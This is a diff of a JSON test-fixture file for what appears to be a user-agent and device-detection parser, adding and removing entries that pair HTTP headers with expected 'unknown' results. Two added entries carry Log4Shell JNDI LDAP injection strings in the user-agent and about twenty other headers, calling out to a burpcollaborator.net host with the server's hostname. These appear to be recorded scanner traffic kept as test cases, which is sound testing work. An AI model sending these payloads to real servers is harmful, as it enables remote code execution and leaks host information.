@@ -1337,92 +1337,6 @@
   },
   {
     "headers": {
-      "dnt": "1",
-      "user-agent": "Buck/2.3; (+https://app.hypefactors.com/media-monitoring/about.html)"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "from": "crawl@docoloc.de",
-      "user-agent": "Docoloc"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "Buck/2.3; (+https://app.hypefactors.com/media-monitoring/about.html)"
     },
     "device": {
@@ -3021,95 +2935,6 @@
   },
   {
     "headers": {
-      "user-agent": "Iceape 2.0.4",
-      "sec-fetch-site": "none",
-      "sec-fetch-mode": "navigate",
-      "sec-fetch-user": "?1",
-      "sec-fetch-dest": "document"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "dnt": "1",
-      "user-agent": "Buck/2.3.1; (+https://app.hypefactors.com/media-monitoring/about.html)"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "Scribbr-Citation-Bot",
       "content-type": "text/html; charset=utf-8"
     },
@@ -4244,6 +4069,198 @@
   {
     "headers": {
       "user-agent": "ManicTime/4.7.5.1"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.useragent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a} fcbz"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "access-control-request-headers": "${jndi:ldap://XXXXX${hostName}.geld.de.accesscontrolrequestheaders.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "access-control-request-method": "${jndi:ldap://XXXXX${hostName}.geld.de.accesscontrolrequestmethod.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "authentication": "Basic ${jndi:ldap://XXXXX${hostName}.geld.de.authenticationbasic.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}, Bearer ${jndi:ldap://XXXXX${hostName}.geld.de.authenticationbearer.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "location": "$%7Bjndi:ldap://XXXXX$%7BhostName%7D.geld.de.location.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a%7D",
+      "origin": "https://fcbz.com",
+      "user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.useragent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a} fcbz",
+      "x-api-version": "${jndi:ldap://XXXXX${hostName}.geld.de.xapiversion.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-csrf-token": "${jndi:ldap://XXXXX${hostName}.geld.de.xcsrftoken.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-druid-comment": "${jndi:ldap://XXXXX${hostName}.geld.de.xdruidcomment.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-origin": "${jndi:ldap://XXXXX${hostName}.geld.dexorigin.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-rewrite-url": "${jndi:ldap://XXXXX${hostName}.geld.de.xReWriteURL.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-remote-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xRemoteIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}, ${jndi:ldap://XXXXX${hostName}.geld.de.xForHost.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-forwarded": "${jndi:ldap://XXXXX${hostName}.geld.de.xForwarded.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-forwarded-for-original": "${jndi:ldap://XXXXX${hostName}.geld.de.xFor4Origional.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-original-host": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalHost.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-original-url": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalURL.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-original-user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalUserAgent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-originally-forwarded-for": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionallyForwardedFor.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-originating-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionatingIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-original-remote-addr": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrionalRemoteIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
+      "x-real-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xRealIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "ManicTime/4.7.5.1",
+      "x-p2p-peerdist": "Version=1.1",
+      "x-p2p-peerdistex": "MinContentInformation=1.0, MaxContentInformation=2.0"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "accept-charset": "ISO-8859-1, utf-8, *;q=0.7",
+      "range": "bytes=0-50000",
+      "user-agent": "Valve/Steam HTTP Client 1.0"
     },
     "device": {
       "architecture": null,
